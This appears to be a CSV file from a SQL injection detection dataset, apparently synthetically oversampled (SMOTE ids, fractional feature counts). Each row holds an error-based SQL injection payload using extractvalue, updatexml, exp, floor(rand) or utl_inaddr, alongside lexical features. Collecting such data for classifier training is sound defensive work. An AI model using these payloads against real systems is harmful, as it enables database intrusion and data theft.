id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001535,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000091,0.6426221456070828,190.27434807221923,32.0,3.695589984559093,53.760025676796154,34.245703281373075,77.51432239542308,24.754296718626925,0.28235337348717315,0.18049416356289316,0.4071213480621921,0.13003111488774158,0.0,4.0,0.0,0.0,0.2514322395423073,1.0,0.0,14.502864479084614,2.7755575615628914e-17,-1.1102230246251565e-16,4.748567760457693,1.2514322395423063,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.5028644790846144,0.0,0.0,0.2514322395423073,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.754296718626922
SMOTE_001536,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000016,1.1122917612497232,210.64543958374514,32.58811073721117,3.5800242187997378,58.41188926278883,32.0,92.05732884653398,28.17622147442233,0.2776302815386145,0.15205587331965323,0.4365712322392825,0.1337426129024497,0.0,4.0,0.0,0.0,1.0,1.0,0.0,17.17622147442233,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.4118892627888353,0.5881107372111648,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001537,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000018,0.835084385165154,189.31875806137538,32.27503224550153,3.921189191729009,48.318758061375384,47.0,66.0,28.0,0.2552198520371465,0.24826004932095116,0.34862049479112295,0.1478996038507794,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,6.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.31875806137538243,0.6812419386246176,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001538,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,1.0794469957500086,204.29274466111806,31.0,3.5529695058288064,54.0,32.0,89.94696619150898,28.345778469609066,0.2660195878603752,0.15764123725059273,0.43782998753577407,0.138509187353258,4.0,0.0,0.0,0.0,1.0,2.0,0.0,16.34577846960907,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001539,attack,error,"1' in boolean mode  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",nearest_attack_euclidean,R000134,0.46037121720450996,272.0517158656557,35.89080429132058,3.985569466389409,108.2528686611293,35.0,97.01723862188523,31.781608582641162,0.39771041255994766,0.12878577631527932,0.3566374261903839,0.11686638493438911,0.8908042913205808,0.0,0.0,0.0,2.0,1.0,0.0,18.89080429132058,2.7755575615628914e-17,2.0,5.109195708679419,3.0,0.890804291320581,0.0,0.0,0.8908042913205809,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,0.8908042913205809,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.890804291320581
SMOTE_001540,attack,error,"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000057,0.031706951182015344,318.115803463685,39.01286705152055,3.9934956524189995,103.09006936064387,63.0,117.0257341030411,35.0,0.32406010712908656,0.19804304792748878,0.3678729294281531,0.11002391551527155,1.0,0.0,2.0,0.0,2.0,2.0,0.0,21.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.012867051520551787,0.987132948479448,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001541,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000049,0.02628203919506366,274.35256998618485,36.0,4.028434750186786,108.0,35.0,97.28205598894789,34.07051399723697,0.3936712558020463,0.12757864771362612,0.3545682642684254,0.1241818322159022,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.070513997236976,2.7755575615628914e-17,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001542,attack,error,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R000113,0.710615173381845,347.4789445691,33.17368514363333,3.595716244040867,94.08422172359997,45.0,146.2631485636667,62.131574281833345,0.2708083146714608,0.12950564296510494,0.42089531820697323,0.17879072415646097,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.826314856366669,0.0,29.652629712733336,1.6526297127333383,3.0,0.0,22.826314856366665,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001543,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000086,0.6162693877099542,189.42560905357186,32.0,3.8975985941295357,50.58401005952431,46.366395976190276,66.31680201190485,26.15840100595243,0.26679282448335534,0.24497458737460562,0.35013145535971407,0.138101132782325,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.841598994047569,4.316802011904861,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.15840100595243065,2.0,0.0,1.0,0.15840100595243067,0.8415989940475693,0.15840100595243062,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.158401005952431
SMOTE_001544,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000133,0.4782492286035767,344.2839087453991,38.19067680606677,3.8565248478000544,109.19067680606676,55.0,139.47458555146585,40.61864638786646,0.31719891701386427,0.15976900069469693,0.4050631675932309,0.11796891469820786,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.618646387866463,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.1906768060667692,0.8093231939332308,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001545,attack,error,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk",nearest_attack_euclidean,R000063,0.12704299894989873,196.1389419160793,30.03674006180901,3.576556579011174,45.367400618090095,38.74281956733693,83.88176148341623,28.146960247236038,0.23123192045164515,0.19785412028372157,0.42739757908399323,0.14351638018064006,4.0,0.0,0.0,0.0,0.036740061809009794,2.0,0.0,16.146960247236038,2.7755575615628914e-17,-1.1102230246251565e-16,5.92651987638198,2.0367400618090095,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0734801236180194,0.0,0.0,0.03674006180900968,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.110220185427028
SMOTE_001546,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.5777462676107167,216.1453874271048,41.258154970841915,4.285856140743271,118.88723245626288,2.0,71.0,24.258154970841918,0.550027354615427,0.009254193589735754,0.32852387243561954,0.11219457935921778,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.0,0.0,10.0,2.7755575615628914e-17,5.258154970841918,1.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001547,attack,error,"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000150,0.7566893743303758,188.33599513594518,35.63935187719512,3.8558088597503146,61.53275452192076,33.172106399115876,72.54097218420733,21.090162030701222,0.32635500069146894,0.17565346577760388,0.38577765289238625,0.11221388063854096,0.0,0.0,2.0,0.0,1.1102230246251565e-16,1.090162030701221,0.0,13.909837969298778,2.7755575615628914e-17,-1.1102230246251565e-16,4.090162030701221,3.0901620307012214,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,0.09016203070122142,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9098379692987789,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.09016203070122109,0.09016203070122109,3.180324061402442
SMOTE_001548,attack,error,"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""wfwg"" like ""wfwg",nearest_attack_euclidean,R000080,0.31747307786401263,206.95216945142707,32.0,3.6228919218864735,59.0,32.0,88.29347454285589,27.658694908571178,0.28558021749453794,0.15489096542076636,0.4259378253255885,0.13359099175910719,0.0,4.0,0.0,0.0,1.0,1.0,0.0,16.658694908571178,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001549,attack,error,"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000010,0.7017304590582943,194.6591756933091,31.56591756933091,3.9319095089524505,52.52734055464728,47.0,67.13183513866181,28.0,0.269496342334676,0.24160534796773475,0.34496320878064085,0.14393510091694836,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,6.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.5659175693309104,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.56591756933091
SMOTE_001550,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,0.6381808264479663,193.26678122801292,27.633390614006466,3.463104579061752,45.533562456025855,36.46643754397414,85.0,26.26678122801293,0.2354848724566579,0.18882668314027484,0.4398351490943815,0.1358532953086858,3.2667812280129294,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.0,0.8166953070032326,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001551,attack,error,"1'  )   where 9544  =  9544 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000044,0.27538413098625825,200.59306258139284,32.5508671773259,3.621522986409401,50.694796936044625,40.0,83.8982656453482,26.0,0.2525296023893509,0.19948687623484676,0.41831705182315193,0.1296664695526504,1.0,0.0,2.0,0.0,1.0,2.0,0.0,15.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001552,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000120,0.038813732994759514,313.23521716214054,40.0,4.034596666189366,103.07056514864217,63.0,113.14113029728433,34.023521716214056,0.32905294614574176,0.2011357810089816,0.3611911679448917,0.10862010490038493,0.011760858107027872,0.988239141892972,2.0,0.0,2.0,2.0,0.0,20.023521716214056,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,7.0,0.011760858107027983,0.988239141892972,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001553,attack,error,"1 where 7932  =  7932 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000074,0.5917863658686376,194.79235544580635,31.27088253184331,3.6114644650943166,49.62529519105986,40.0,80.62529519105986,24.541765063686622,0.25458813229711985,0.20554988589369805,0.41388929386473583,0.12597268794444622,0.27088253184331035,0.0,2.0,0.0,1.0,2.0,0.0,14.27088253184331,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.27088253184331046,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001554,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000084,0.6686559912156171,317.7186066591997,37.45748853273597,3.992693038070206,109.22874426636798,55.0,117.57488532735975,35.91497706547195,0.34410941266505024,0.17329069308514056,0.3696089331739964,0.11299096107581279,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.914977065471952,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.2287442663679875,0.7712557336320125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001555,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,0.8201296446271977,201.09940645345736,31.0,3.5812515003339667,54.0,32.0,87.31715825578841,27.782248197668945,0.27003215943021064,0.16001905744012485,0.43201219585881223,0.13793658727085228,4.0,0.0,0.0,0.0,1.0,2.0,0.0,15.782248197668945,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,3.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001556,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000111,0.09793628265330909,247.68757207433723,34.84378603716861,3.9826955906423946,94.0,34.84378603716861,89.0,29.84378603716861,0.37951364124397297,0.14067325456687668,0.3593267454331233,0.12048635875602706,0.0,0.0,0.0,0.0,2.0,1.0,0.0,18.0,2.7755575615628914e-17,2.0,5.84378603716861,3.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
SMOTE_001557,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000031,1.0087623727169999,339.88228843474906,32.6587461216989,3.3111350064355487,77.32937306084945,47.32937306084945,157.44708462610038,57.77645768694981,0.22750399486663203,0.13923479933739794,0.4632727322759096,0.1699884735200604,0.0,0.0,0.7764576869498159,0.0,1.1102230246251565e-16,2.0,0.0,32.22354231305018,2.7755575615628914e-17,-1.1102230246251565e-16,0.0,22.776457686949815,0.0,0.0,0.0,0.7764576869498159,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2235423130501839,0.7764576869498161,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001558,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000148,0.35606124097995423,210.91033806032792,35.52507683189271,3.6781773382183736,54.33510756464979,40.0,89.86018439654251,26.715046099135627,0.2575598976956559,0.18984800721645118,0.425936595456916,0.12665549963097691,0.0,0.9050153663785419,2.0,0.0,1.0,2.0,0.0,15.810030732757085,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.0,0.9050153663785419,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.9050153663785419,0.09498463362145815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001559,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000064,0.08109437279023705,197.20791175885364,32.0,3.935424199498309,58.68813236171951,43.415823517707324,68.0,27.10395587942683,0.297612307259301,0.2201356280733014,0.3448170293191325,0.1374350353482651,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.103955879426831,6.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
